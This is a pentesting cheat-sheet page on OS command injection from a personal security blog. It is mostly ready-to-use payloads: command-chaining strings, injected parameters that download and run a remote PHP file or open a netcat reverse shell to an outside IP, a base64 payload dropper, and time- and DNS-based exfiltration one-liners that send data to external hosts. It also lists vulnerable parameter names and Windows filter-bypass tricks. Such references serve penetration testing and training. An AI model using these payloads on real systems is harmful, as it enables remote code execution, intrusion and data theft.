<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> Command Injection | 47z!h4Ck </title> <meta name="author" content="47z!Lu7h "> <meta name="description" content=""> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link href="/assets/css/bootstrap-toc.min.css?6f5af0bb9aab25d79b2448143cbeaa88" rel="stylesheet"> <link rel="shortcut icon" href="data:image/svg+xml,&lt;svg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20100%20100%22&gt;&lt;text%20y=%22.9em%22%20font-size=%2290%22&gt;%E2%9A%9B%EF%B8%8F&lt;/text&gt;&lt;/svg&gt;"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://47z1lu7h.github.io/projects/pentesting-web/2025-01-01-command-injection/"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script src="/assets/js/theme.js?0afe9f0ae161375728f7bcc5eb5b4ab4"></script> </head> <body class="fixed-top-nav sticky-bottom-footer"> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> 47z!h4Ck </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">h0m3 </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item active"> <a class="nav-link" href="/projects/">projects <span class="sr-only">(current)</span> </a> </li> <li class="nav-item "> <a class="nav-link" href="/repositories/">repositories </a> </li> <li class="nav-item "> <a class="nav-link" href="/cv/">cv </a> </li> <li class="nav-item "> <a class="nav-link" href="/teaching/">teaching </a> </li> <li class="nav-item "> <a class="nav-link" href="/people/">people </a> </li> <li class="nav-item "> <a class="nav-link" href="/hacking/">hacking </a> </li> <li class="nav-item dropdown "> <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">submenus </a> <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown"> <a class="dropdown-item " href="/publications/">publications</a> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/projects/">projects</a> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/blog/">blog</a> </div> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="fa-solid fa-moon"></i> <i class="fa-solid fa-sun"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="row"> <div class="col-sm-3"> <nav id="toc-sidebar" class="sticky-top"></nav> </div> <div class="col-sm-9"> <div class="post"> <header class="post-header"> <h1 class="post-title">Command Injection</h1> <p class="post-description"></p> </header> <article> <h1 id="command-injection">Command Injection</h1> <h2 id="what-is-command-injection">What is command Injection?</h2> <p>A <strong>command injection</strong> permits the execution of arbitrary operating system commands by an attacker on the server hosting an application. As a result, the application and all its data can be fully compromised. The execution of these commands typically allows the attacker to gain unauthorized access or control over the application’s environment and underlying system.</p> <h3 id="context">Context</h3> <p>Depending on <strong>where your input is being injected</strong> you may need to <strong>terminate the quoted context</strong> (using <code class="language-plaintext highlighter-rouge">"</code> or <code class="language-plaintext highlighter-rouge">'</code>) before the commands.</p> <h2 id="command-injectionexecution">Command Injection/Execution</h2> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#Both Unix and Windows supported</span>
<span class="nb">ls</span><span class="o">||</span><span class="nb">id</span><span class="p">;</span> <span class="nb">ls</span> <span class="o">||</span><span class="nb">id</span><span class="p">;</span> <span class="nb">ls</span><span class="o">||</span> <span class="nb">id</span><span class="p">;</span> <span class="nb">ls</span> <span class="o">||</span> <span class="nb">id</span> <span class="c"># Execute both</span>
<span class="nb">ls</span>|id<span class="p">;</span> <span class="nb">ls</span> |id<span class="p">;</span> <span class="nb">ls</span>| <span class="nb">id</span><span class="p">;</span> <span class="nb">ls</span> | <span class="nb">id</span> <span class="c"># Execute both (using a pipe)</span>
<span class="nb">ls</span><span class="o">&amp;&amp;</span><span class="nb">id</span><span class="p">;</span> <span class="nb">ls</span> <span class="o">&amp;&amp;</span><span class="nb">id</span><span class="p">;</span> <span class="nb">ls</span><span class="o">&amp;&amp;</span> <span class="nb">id</span><span class="p">;</span> <span class="nb">ls</span> <span class="o">&amp;&amp;</span> <span class="nb">id</span> <span class="c">#  Execute 2º if 1º finish ok</span>
<span class="nb">ls</span>&amp;id<span class="p">;</span> <span class="nb">ls</span> &amp;id<span class="p">;</span> <span class="nb">ls</span>&amp; <span class="nb">id</span><span class="p">;</span> <span class="nb">ls</span> &amp; <span class="nb">id</span> <span class="c"># Execute both but you can only see the output of the 2º</span>
<span class="nb">ls</span> %0A <span class="nb">id</span> <span class="c"># %0A Execute both (RECOMMENDED)</span>

<span class="c">#Only unix supported</span>
<span class="sb">`</span><span class="nb">ls</span><span class="sb">`</span> <span class="c"># ``</span>
<span class="si">$(</span><span class="nb">ls</span><span class="si">)</span> <span class="c"># $()</span>
<span class="nb">ls</span><span class="p">;</span> <span class="nb">id</span> <span class="c"># ; Chain commands</span>
<span class="nb">ls</span><span class="k">${</span><span class="nv">LS_COLORS</span>:10:1<span class="k">}${</span><span class="nv">IFS</span><span class="k">}</span><span class="nb">id</span> <span class="c"># Might be useful</span>

<span class="c">#Not executed but may be interesting</span>
<span class="o">&gt;</span> /var/www/html/out.txt <span class="c">#Try to redirect the output to a file</span>
&lt; /etc/passwd <span class="c">#Try to send some input to the command</span>
</code></pre></div></div> <h3 id="limition-bypasses"> <strong>Limition</strong> Bypasses</h3> <p>If you are trying to execute <strong>arbitrary commands inside a linux machine</strong> you will be interested to read about this <strong>Bypasses:</strong></p> <p>../linux-hardening/bypass-bash-restrictions/</p> <h3 id="examples"><strong>Examples</strong></h3> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vuln=127.0.0.1 %0a wget https://web.es/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php
vuln=127.0.0.1%0anohup nc -e /bin/bash 51.15.192.49 80
vuln=echo PAYLOAD &gt; /tmp/pay.txt; cat /tmp/pay.txt | base64 -d &gt; /tmp/pay; chmod 744 /tmp/pay; /tmp/pay
</code></pre></div></div> <h3 id="parameters">Parameters</h3> <p>Here are the top 25 parameters that could be vulnerable to code injection and similar RCE vulnerabilities (from <a href="https://twitter.com/trbughunters/status/1283133356922884096" rel="external nofollow noopener" target="_blank">link</a>):</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>?cmd={payload}
?exec={payload}
?command={payload}
?execute{payload}
?ping={payload}
?query={payload}
?jump={payload}
?code={payload}
?reg={payload}
?do={payload}
?func={payload}
?arg={payload}
?option={payload}
?load={payload}
?process={payload}
?step={payload}
?read={payload}
?function={payload}
?req={payload}
?feature={payload}
?exe={payload}
?module={payload}
?payload={payload}
?run={payload}
?print={payload}
</code></pre></div></div> <h3 id="time-based-data-exfiltration">Time based data exfiltration</h3> <p>Extracting data: char by char</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
real    0m5.007s
user    0m0.000s
sys 0m0.000s

swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
real    0m0.002s
user    0m0.000s
sys 0m0.000s
</code></pre></div></div> <h3 id="dns-based-data-exfiltration">DNS based data exfiltration</h3> <p>Based on the tool from <code class="language-plaintext highlighter-rouge">https://github.com/HoLyVieR/dnsbin</code> also hosted at dnsbin.zhack.ca</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. Go to http://dnsbin.zhack.ca/
2. Execute a simple 'ls'
for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
</code></pre></div></div> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)
</code></pre></div></div> <p>Online tools to check for DNS based data exfiltration:</p> <ul> <li>dnsbin.zhack.ca</li> <li>pingb.in</li> </ul> <h3 id="filtering-bypass">Filtering bypass</h3> <h4 id="windows">Windows</h4> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>powershell C:**2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:**32\c*?c.e?e # calc
</code></pre></div></div> <h4 id="linux">Linux</h4> <p>../linux-hardening/bypass-bash-restrictions/</p> <h2 id="brute-force-detection-list">Brute-Force Detection List</h2> <p>https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/command_injection.txt</p> <h2 id="references">References</h2> <ul> <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection" rel="external nofollow noopener" target="_blank">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection</a></li> <li><a href="https://portswigger.net/web-security/os-command-injection" rel="external nofollow noopener" target="_blank">https://portswigger.net/web-security/os-command-injection</a></li> </ul> </article> </div> </div> </div> </div> <footer class="sticky-bottom mt-5" role="contentinfo"> <div class="container"> © Copyright 2025 47z!Lu7h . Love is life. And if you miss love, you miss life. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@4/imagesloaded.pkgd.min.js"></script> <script defer src="/assets/js/masonry.js" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script defer src="/assets/js/bootstrap-toc.min.js?c82ff4de8b0955d6ff14f5b05eed7eb6"></script> <script src="/assets/js/no_defer.js?2930004b8d7fcd0a8e00fdcfc8fc9f24"></script> <script defer src="/assets/js/common.js?4a129fbf39254905f505c7246e641eaf"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script> <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript">function progressBarSetup(){"max"in document.createElement("progress")?(initializeProgressElement(),$(document).on("scroll",function(){progressBar.attr({value:getCurrentScrollPosition()})}),$(window).on("resize",initializeProgressElement)):(resizeProgressBar(),$(document).on("scroll",resizeProgressBar),$(window).on("resize",resizeProgressBar))}function getCurrentScrollPosition(){return $(window).scrollTop()}function initializeProgressElement(){let e=$("#navbar").outerHeight(!0);$("body").css({"padding-top":e}),$("progress-container").css({"padding-top":e}),progressBar.css({top:e}),progressBar.attr({max:getDistanceToScroll(),value:getCurrentScrollPosition()})}function getDistanceToScroll(){return $(document).height()-$(window).height()}function resizeProgressBar(){progressBar.css({width:getWidthPercentage()+"%"})}function getWidthPercentage(){return getCurrentScrollPosition()/getDistanceToScroll()*100}const progressBar=$("#progress");window.onload=function(){setTimeout(progressBarSetup,50)};</script> </body> </html>